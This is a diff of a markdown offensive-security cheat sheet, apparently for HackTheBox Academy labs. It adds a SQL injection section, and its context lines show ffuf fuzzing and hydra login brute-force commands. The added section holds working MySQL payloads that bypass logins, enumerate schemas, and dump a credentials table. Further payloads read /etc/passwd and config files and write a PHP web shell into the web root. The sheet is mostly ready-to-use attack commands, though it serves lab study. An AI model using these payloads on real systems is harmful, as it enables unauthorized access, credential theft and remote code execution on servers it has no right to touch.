@@ -89,7 +89,7 @@ for i in $(seq 1 1000); do echo $i >> ids.txt; done
 ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
 ```
 
-## 2) Web Login Bruteforce
+## 3) Web Login Bruteforce
 
 Bruteforce with POST request
 ```bash
@@ -101,4 +101,98 @@ hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USE
 Bruteforce with GET request
 ```bash
 hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get /
+```
+
+## 4) SQL Injection
+### Basic Payload
+```sql
+admin' or '1'='1
+
+admin' or '1'='1' --
+
+admin' or '1'='1' -- -
+```
+
+### Union (MYSQL)
+Detect Number of Columns
+```sql
+' order by 1-- -
+
+cn' UNION select 1,2,3-- -
+```
+
+Injection
+```sql
+cn' UNION select 1,@@version,3,4-- -
+```
+Injection for 4 columns
+```sql
+UNION select username, 2, 3, 4 from passwords-- -
+```
+
+Enumerate Database Names
+```sql
+cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
+```
+
+Check Current Database
+```sql
+cn' UNION select 1,database(),2,3-- -
+```
+
+Enumerate Tables within a database (dev in this case)
+```sql
+cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
+```
+
+Enumerate Columns from table (credentials in this case)
+```sql
+cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
+```
+
+Query Data from Table
+```sql
+cn' UNION select 1, username, password, 4 from dev.credentials-- -
+```
+
+Get Current DB User
+```sql
+cn' UNION SELECT 1, user(), 3, 4-- -
+
+cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
+```
+
+Check Current User Privileges
+```sql
+cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
+
+-- Y Would mean the user has superuser privileges
+
+cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
+
+-- Current user root privileges
+cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
+```
+Read a File
+```sql
+cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
+
+cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
+
+cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
+```
+
+Write to a File requires:
+1. User with FILE privilege enabled
+2. MySQL global secure_file_priv variable not enabled
+3. Write access to the location we want to write to on the back-end server
+
+Check if secure_file_priv is empty
+```sql
+cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
+```
+
+Write PHP Shell to file
+```sql
+cn' union select 1,'<?=`$_GET[0]`?>',3,4 into outfile '/var/www/html/test.php'-- -
 ```
